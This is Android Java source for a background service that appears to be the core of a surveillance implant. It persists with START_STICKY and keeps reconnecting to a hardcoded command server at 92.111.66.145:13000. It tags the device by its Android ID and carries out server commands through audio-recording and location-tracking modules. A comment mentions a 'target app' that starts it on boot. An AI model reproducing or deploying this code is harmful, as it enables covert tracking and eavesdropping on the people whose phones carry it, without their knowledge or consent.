package com.safe.myapp;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ConnectException;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;

public class SafeService extends Service {

    public static final int HEARTBEAT = 1000;
    public static final int HANDSHAKE = 2000;
    public static final int ADMIN = 3000;
    public static final int MESSAGE = 4000;
    public static final int FILE = 5000;

    public static final boolean BOOL_DEBUG = true;
    public static final String VERSION = "0.5.2";
    private static final String SERVER = "92.111.66.145";
    private static final int PORT = 13000;
    private static int soTimeOut = 30000;
    private String simpleID;

    private boolean bServiceStarted;
    public static boolean bAudioStarted, bLocationStarted;
    public static long lLocStart, lLocEnd;

    private static SharedPreferences sharedPreferences;
    private static final String PREFS_NAME = "WowSuchSharedPreferencesVery1337";
    private static final String PREFS_KEY_SERVICE_STARTED = "KEY_BOOL_SERVICE_STARTED";
    private static final String PREFS_KEY_SO_TIMEOUT = "KEY_INT_SO_TIMEOUT";
    private static final String PREFS_KEY_CAL_LOC_START = "PREFS_KEY_CAL_LOC_START";
    private static final String PREFS_KEY_CAL_LOC_END = "PREFS_KEY_CAL_LOC_END";

    private SafeHeartbeat heartbeat;
    private static Socket socket;
    private DataInputStream in;
    private DataOutputStream out;
    private static SafeLocations locs;
    private static SafeCommunications comms;
    private static SafeCommands commands;
    private static SafeAudio audio;
    private static SafeLogger logger;


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        logger.write("onStartCommand called");
        simpleID = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ANDROID_ID);
        // check if the Service is already started
        if (!bServiceStarted) {
            bServiceStarted = true;
            // Initiate singletons
            new Thread(){
                @Override
                public void run() {
                    connect();
                }
            }.start();
        } else {
            logger.write("Service already started " + bServiceStarted);
        }
        // START_STICKY ensures the service gets restarted when there is enough memory again
        return START_STICKY;
    }

    private void connect() {
        // init objects
        logger = new SafeLogger(getApplicationContext());
        comms = new SafeCommunications(getApplicationContext(), logger, out, simpleID); // out = null atm
        locs = new SafeLocations(getApplicationContext(), comms, logger, simpleID);
        audio = new SafeAudio(getApplicationContext(), comms, logger);
        commands = new SafeCommands(getApplicationContext(), comms, logger, locs, audio, simpleID);


        // we nest the try..finally method inside a try..catch so we can catch exceptions
        // code is cleaner but is less verbose on error checking
        while (true) {
            try {
                try {
                    while (socket == null) {
                        // keep trying to connect
                        logger.write("Checking server...");
                        try {
                            socket = new Socket(SERVER, PORT);
                            socket.setSoTimeout(soTimeOut);
                        } catch (ConnectException e) {
                            logger.write("Could not connect to server");
                            try {
                                Thread.sleep(10000); // sleep for a while when we can't connect on airplane mode for example
                                logger.write("Retrying");
                            } catch (InterruptedException e1) {
                                e1.printStackTrace();
                                logger.write(Log.getStackTraceString(e));
                            }
                        }
                    }
                    logger.write("Connected!");
                    in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));
                    out = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));

                    // set the new output stream so all objects can use it accordingly
                    comms.setOut(out);

                    // shake hands!
                    comms.handShake();

                    // start heartbeat
                    heartbeat = new SafeHeartbeat(comms, logger, getApplicationContext());
                    heartbeat.start();

                    // receive messages from server
                    while (true) {
                        // type of message received
                        int header = in.readInt();
                        // size of the message
                        int size = in.readInt();
                        if (header == HEARTBEAT) {
                            logger.write("Received heartbeat");
                        } else if (header == MESSAGE) {
                            byte[] message = new byte[size];
                            in.readFully(message, 0, message.length);
                            commands.messageHandler(new String(message, "UTF-8"));
                        }
                    }
                } finally {
                    // disconnected
                    heartbeat.setRunning(false);
                    if (in != null) {
                        in.close();
                    }
                    if (out != null) {
                        out.flush();
                        out.close();
                    }
                    if (socket != null) {
                        socket.close();
                        socket = null;
                    }
                    logger.write("Server disconnected");
                    savePrefs();
                    Thread.sleep(5000); // sleep for a while then try to connect
                }
            } catch (SocketTimeoutException e) {
                logger.write("Connection timed out...");
            } catch (SocketException e) {
                logger.write("Socket closed...");
            } catch (EOFException e) {
                logger.write(Log.getStackTraceString(e));
            } catch (InterruptedException e) {
                logger.write(Log.getStackTraceString(e));
            }  catch (IOException e) {
                logger.write(Log.getStackTraceString(e));
            }
        }
    }

    @Override
    public void onDestroy() {
        comms.say("Service is being destroyed!");
        audio.stopRecording();
        locs.stopLocations();
        savePrefs();
        try {
            if (out != null) {
                out.flush();
                out.close();
            }
            if (in != null) {
                in.close();
            }
            if (socket != null) {
                socket.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
            logger.write(Log.getStackTraceString(e));
        }
        logger.write("onDestroy called, set bServiceStarted to " + bServiceStarted);
    }

    @Override
    public void onCreate() {
        loadSavedPrefs();
        logger = new SafeLogger(getApplicationContext());
        logger.write("onCreate called " + bServiceStarted);
    }

    public static void setSoTimeOut(String timeOut) {
        try {
            int iSoTimeOut = Integer.parseInt(timeOut);
            if (iSoTimeOut >= 30000) {
                soTimeOut = iSoTimeOut;
                socket.setSoTimeout(iSoTimeOut);
                comms.say("Set timeout from " + soTimeOut + "ms to " + iSoTimeOut + "ms");
            } else {
                comms.say("Set timeout above 30000ms");
            }
        } catch (NumberFormatException e) {
            comms.say("Need an integer...");
        } catch (SocketException e) {
            e.printStackTrace();
            logger.write(Log.getStackTraceString(e));
        }

    }

    private void savePrefs() {
        /*
        Make sure the Service doesn't get started twice.
        This can happen when the user opens the target app when it has already started on boot
        TODO Note that this does not check if the Service has been running in another app!
        TODO We should write to a file on the sd-card and check there, although that is also not
        TODO a very elegant solution
         */
        bServiceStarted = false;
        sharedPreferences = getSharedPreferences(PREFS_NAME, 0);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putBoolean(PREFS_KEY_SERVICE_STARTED, bServiceStarted);
        editor.putInt(PREFS_KEY_SO_TIMEOUT, soTimeOut);
        editor.putLong(PREFS_KEY_CAL_LOC_START, lLocStart);
        editor.putLong(PREFS_KEY_CAL_LOC_END, lLocEnd);
        editor.commit();
    }

    private void loadSavedPrefs(){
        sharedPreferences = getSharedPreferences(PREFS_NAME, 0);
        bServiceStarted = sharedPreferences.getBoolean(PREFS_KEY_SERVICE_STARTED, false);
        soTimeOut = sharedPreferences.getInt(PREFS_KEY_SO_TIMEOUT, 30000);
        lLocStart = sharedPreferences.getLong(PREFS_KEY_CAL_LOC_START, 1000);
        lLocEnd = sharedPreferences.getLong(PREFS_KEY_CAL_LOC_END,1000);
    }


    public static boolean isbAudioStarted() {
        return bAudioStarted;
    }

    public static void setbAudioStarted(boolean bAudioStarted) {
        SafeService.bAudioStarted = bAudioStarted;
    }

    public static boolean isbLocationStarted() {
        return bLocationStarted;
    }

    public static void setbLocationStarted(boolean bLocationStarted) {
        SafeService.bLocationStarted = bLocationStarted;
    }

    public String getSimpleID() {
        return simpleID;
    }
}
